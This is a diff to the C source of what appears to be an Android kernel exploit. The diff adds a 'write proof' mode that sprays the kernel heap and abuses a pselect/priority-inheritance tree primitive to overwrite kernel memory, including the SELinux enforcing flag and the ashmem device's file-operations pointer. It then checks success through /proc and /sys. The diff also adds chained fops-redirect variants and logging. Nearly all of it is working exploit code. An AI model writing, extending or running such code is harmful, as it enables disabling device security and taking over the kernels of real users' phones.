@@ -107,27 +107,9 @@ static int select_offsets(void) {
 static struct timespec t0;
 static void timer_reset(void) { clock_gettime(CLOCK_MONOTONIC, &t0); }
 
-/* Durable stage marker: survives softboot better than stdout page-cache alone. */
+/* Durable stage marker: O_SYNC live_sync + stage paths (survives softboot). */
 static void durable_stage(const char *stage) {
-  const char *paths[] = {
-    "/storage/emulated/0/ghostlock_logs/stage.txt",
-    "/sdcard/ghostlock_logs/stage.txt",
-    "/data/local/tmp/ghostlock_run/stage.txt",
-  };
-  char line[256];
-  struct timespec ts;
-  clock_gettime(CLOCK_MONOTONIC, &ts);
-  int n = snprintf(line, sizeof(line), "T+%ld.%03ld %s pid=%d\n",
-                   (long)ts.tv_sec, ts.tv_nsec / 1000000L, stage, (int)getpid());
-  if (n < 0) return;
-  for (size_t i = 0; i < sizeof(paths) / sizeof(paths[0]); i++) {
-    int fd = open(paths[i], O_WRONLY | O_CREAT | O_APPEND, 0644);
-    if (fd < 0) continue;
-    (void)write(fd, line, (size_t)n);
-    (void)fsync(fd);
-    close(fd);
-  }
-  /* also force stdout path */
+  live_sync_log("STAGE", stage);
   pr_info("STAGE %s\n", stage);
   fflush(stdout);
   fsync(STDOUT_FILENO);
@@ -755,21 +737,142 @@ int run_exploit(int argc, char **argv) {
 
   /* FORCE_WRITE1=1: skip UMH mode=4 and go straight to SELinux write1. */
   int force_w1 = env_flag("FORCE_WRITE1", 0);
+  /*
+   * MODE4_WRITE_PROOF / MODE4_ARISTOTLE: prove rb_erase store without fops swap.
+   * Default target = sysctl_bootid (P0). Compare /proc boot_id before/after.
+   * WRITE_PROOF_TARGET=enforce|fops|bootid (default bootid).
+   * Always MODE4_ONLY (never W1). Auto-enables aristotle only-left stamp in fops.
+   */
+  int write_proof = env_flag("MODE4_WRITE_PROOF", 0) ||
+                    env_flag("MODE4_ARISTOTLE", 0);
+  if (write_proof && umh_available && !force_w1) {
+    char boot_before[80];
+    char boot_after[80];
+    char enf_before[8];
+    char enf_after[8];
+    read_first_line("/proc/sys/kernel/random/boot_id", boot_before,
+                    sizeof(boot_before));
+    read_first_line("/sys/fs/selinux/enforce", enf_before, sizeof(enf_before));
+
+    const char *tgt_name = getenv("WRITE_PROOF_TARGET");
+    if (!tgt_name || !tgt_name[0])
+      tgt_name = "bootid";
+    uintptr_t proof_tgt;
+    uintptr_t proof_val;
+    const char *desc;
+    /*
+     * only-left stores parent_color into *target. parent is always fake_fops
+     * (spray). proof_val is unused for geometry (kept 0 → prepare may set
+     * pselect_custom_value=fake_fops for bookkeeping).
+     */
+    if (!strcmp(tgt_name, "enforce") || !strcmp(tgt_name, "selinux")) {
+      proof_tgt = data_addr(SELINUX_ENFORCING);
+      proof_val = 0;
+      desc = "WRITE_PROOF enforce (only-left *enf=fake_fops; may not be 0)";
+    } else if (!strcmp(tgt_name, "fops") || !strcmp(tgt_name, "misc")) {
+      proof_tgt = data_addr(ASHMEM_MISC_FOPS);
+      proof_val = 0;
+      desc = "WRITE_PROOF fops (only-left *MISC=fake_fops)";
+    } else {
+      /* Prefer p0-profile sysctl_bootid if same as SLIDE; else slide_boot_id */
+      uint64_t boot_off =
+          (active_offsets && active_offsets->off_slide_boot_id)
+              ? active_offsets->off_slide_boot_id
+              : SLIDE_SYSCTL_BOOTID_OFF;
+      proof_tgt = data_addr(KIMAGE_TEXT_BASE + boot_off);
+      proof_val = 0;
+      desc = "WRITE_PROOF bootid (only-left *bootid=fake_fops)";
+    }
+
+    pr_success("WRITE_PROOF start %s target=%s addr=%016zx val=%016zx "
+               "boot_before=%s enforce_before=%s\n",
+               desc, tgt_name, proof_tgt, proof_val, boot_before, enf_before);
+    durable_stage("write_proof_enter");
+    slab_drain();
+    TIMER("pre-WRITE_PROOF drain");
+    /* mode=4 so fops packing + MODE4_ARISTOTLE stamp apply */
+    set_pselect_write_mode(proof_tgt, proof_val, 4);
+    if (!proof_val && (!strcmp(tgt_name, "fops") || !strcmp(tgt_name, "misc"))) {
+      /* value filled in prepare_skb_payload as fake_fops when 0 */
+    }
+    pselect_child_node = 1;
+    TIMER("  heap spray start");
+    durable_stage("spray_start");
+    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+    if (!page_base) {
+      pr_error("WRITE_PROOF heap spray failed\n");
+      clear_pselect_write();
+      return 1;
+    }
+    /* If fops path left value 0, payload set pselect_custom_value=fake_fops;
+     * re-stamp stack uses that via pselect_custom_value in prepare_pselect. */
+    if ((!proof_val) && pselect_custom_value)
+      proof_val = pselect_custom_value;
+    TIMER("  heap spray done");
+    durable_stage("spray_done_before_route_threads");
+    run_main_route_threads();
+    durable_stage("route_threads_returned");
+    TIMER("  PI route done");
+    clear_pselect_write();
+
+    read_first_line("/proc/sys/kernel/random/boot_id", boot_after,
+                    sizeof(boot_after));
+    read_first_line("/sys/fs/selinux/enforce", enf_after, sizeof(enf_after));
+    int boot_wrote = strcmp(boot_before, boot_after) != 0;
+    int enf_wrote = (enf_before[0] != enf_after[0]);
+    int landed = 0;
+    if (!strcmp(tgt_name, "enforce") || !strcmp(tgt_name, "selinux"))
+      landed = enf_wrote;
+    else if (!strcmp(tgt_name, "fops") || !strcmp(tgt_name, "misc"))
+      landed = (cfi_last_step == 0 && cfi_dirty_seen) || (cfi_write_ret > 0);
+    else
+      landed = boot_wrote;
+
+    pr_success("WRITE_PROOF done landed=%d boot_wrote=%d enf_wrote=%d "
+               "boot_after=%s enforce_after=%s success_calls "
+               "cfi_step=%d cfi_errno=%d cfi_wr=%zd\n",
+               landed, boot_wrote, enf_wrote, boot_after, enf_after,
+               cfi_last_step, cfi_last_errno, cfi_write_ret);
+    durable_stage(landed ? "write_proof_LANDED" : "write_proof_miss");
+    pr_info("WRITE_PROOF %s — stopping (no W1). MODE4_ONLY implied.\n",
+            landed ? "POSITIVE store executes on-device"
+                   : "NEGATIVE (walk miss / wrong alias / no write)");
+    return landed ? 0 : 1;
+  }
+
   if (!selinux_ok && umh_available && !force_w1) {
     /* UMH path: mode=4 redirects miscdevice fops via W0's pi_tree.
      * miscdevice starts at ASHMEM_FOPS_PTR (repr(transparent) Registration).
      * fops at miscdevice+0x10 = ASHMEM_MISC_FOPS. */
-    pr_info("UMH path: fops redirect (mode=4)...\n");
+    int chain = env_flag("MODE4_CHAIN", 0);
+    int zion = env_flag("MODE4_ZION", 0);
+    pr_info("UMH path: fops redirect (mode=4)%s...\n",
+            zion ? " MODE4_ZION NAME0→ION"
+                 : (chain ? " MODE4_CHAIN ZERO→OWNER→ION" : ""));
+    live_sync_log("MAIN", zion ? "umh_zion_start"
+                               : (chain ? "umh_chain_start" : "umh_mode4_start"));
+    {
+      char b[96];
+      read_first_line("/proc/sys/kernel/random/boot_id", b, sizeof(b));
+      live_sync_log("BOOT_BEFORE", b);
+    }
     slab_drain();
     TIMER("pre-UMH drain");
     do_one_write(data_addr(ASHMEM_MISC_FOPS), "fops redirect", 4);
     TIMER("fops redirect done");
+    {
+      char b[96];
+      read_first_line("/proc/sys/kernel/random/boot_id", b, sizeof(b));
+      live_sync_log("BOOT_AFTER", b);
+    }
+    live_sync_log("MAIN", "umh_mode4_done");
     selinux_ok = check_selinux_off();
-    /* CPH isolation: stop after mode4 (Write1 packing softboots). */
-    if (env_flag("MODE4_ONLY", 0)) {
-      pr_info("MODE4_ONLY=1: stop after fops redirect (cfi step=%d errno=%d)\n",
-              cfi_last_step, cfi_last_errno);
-      return (cfi_last_step == 0 && cfi_dirty_seen) ? 0 : 1;
+    /* CPH isolation: stop after mode4/chain (Write1 packing softboots). */
+    if (env_flag("MODE4_ONLY", 0) || chain || zion) {
+      pr_info("MODE4_ONLY/CHAIN/ZION stop after fops (cfi step=%d errno=%d wr=%zd)\n",
+              cfi_last_step, cfi_last_errno, cfi_write_ret);
+      live_sync_log("MAIN", "stop_no_w1");
+      return (cfi_last_step == 0 && cfi_dirty_seen) || cfi_write_ret > 0 ? 0 : 1;
     }
   } else if (force_w1) {
     pr_info("FORCE_WRITE1=1: skipping UMH mode=4\n");
